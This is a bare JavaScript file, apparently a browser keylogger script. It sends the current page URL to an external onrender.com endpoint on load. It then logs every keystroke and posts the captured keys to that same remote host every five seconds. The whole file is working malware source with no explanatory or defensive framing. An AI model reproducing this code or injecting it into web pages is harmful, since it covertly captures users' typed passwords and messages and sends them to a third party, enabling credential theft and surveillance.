var keys = '';
var current = document.URL;

var xhr = new XMLHttpRequest();
xhr.open("POST", "https://flask-backend-mm3t.onrender.com/keylog", true);
xhr.setRequestHeader('Content-Type', 'application/json');
const json = {
    "logged": current,
};
xhr.send(JSON.stringify(json));

document.onkeydown = function (e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}

window.setInterval(function () {
    if (keys != "") {
        var xhr_key = new XMLHttpRequest();
        xhr_key.open("POST", "https://flask-backend-mm3t.onrender.com/keylog", true);
        xhr_key.setRequestHeader('Content-Type', 'application/json');
        const json_key = {
            "logged": keys,
        };
        xhr_key.send(JSON.stringify(json_key));
        keys = "";
    }
}, 5000);